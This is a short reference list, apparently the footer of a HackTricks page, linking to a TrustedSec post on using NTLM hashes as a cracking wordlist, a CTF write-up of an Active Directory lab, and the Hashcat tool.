- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
